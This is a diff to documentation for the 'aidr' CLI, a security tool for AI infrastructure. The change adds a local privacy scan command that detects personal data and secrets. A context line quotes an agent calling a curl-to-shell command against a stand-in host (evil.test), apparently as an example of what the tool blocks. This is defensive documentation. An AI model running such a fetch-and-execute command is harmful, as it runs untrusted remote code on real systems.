@@ -1493,7 +1493,7 @@ An internal agent calls `safeRun("curl http://evil.test/x.sh | sh")`. The check 
 **What it does**
 `@singularityrd/aidr-cli` (binary `aidr`) configures local AIDR state, reports
 installation health, handles operator approvals and allowlists, reads the audit log, and
-runs AI-infrastructure and skill scans.
+runs AI-infrastructure, skill and local privacy scans.
 
 **Why it matters**
 Operators need one tool for day-to-day questions: is protection on, what was blocked, what
@@ -1520,6 +1520,7 @@ Commands, from `packages/cli/src/index.ts`:
 | `aidr scan` | `-t, --target <url...>`, `-f, --file <path>`, `--skill <path...>`, `--json`, `--allow-public`, `--timeout <ms>`, `--concurrency <n>`, `--save-report <path>`, `--upload` | AI-infrastructure CVE scan (private targets by default) and T01–T09 skill scan |
 | `aidr collect` | `--tenant <id>` (required), `--provider <id>`, `-t, --target`, `-f, --file`, `--inventory <path>`, `--interval <seconds>`, `--stale-after <minutes>`, `--retry-attempts <n>`, `--retry-base-ms <ms>`, `--timeout <ms>`, `--concurrency <n>`, `--allow-public`, `--json` | Tenant-scoped AI-infrastructure inventory |
 | `aidr discover` | `--config <paths...>`, `--json`, `--upload` | Inventory local MCP servers with risk indicators |
+| `aidr privacy scan [file]` | `--json`, `--mask`, `--types <list>`, `--fail-on none\|any\|secret` (default `any`) | Local TR/EN personal-data and secret scan of a file or stdin (TCKN, IBAN, phone, e-mail, card, secrets, ...); prints type, count and line, never the value; `--mask` prints a `[TYPE]`-redacted copy; exit `0` clean, `2` findings, `3` incomplete inspection, `1` error |
 | `aidr uninstall` | `--home <path>`, `--json` | Remove only AIDR-managed hooks (Claude Code endpoint-installer receipt), preserving your own |
 
 `--secret-store` accepts `windows-dpapi`, `macos-keychain`, `linux-secret-service` or
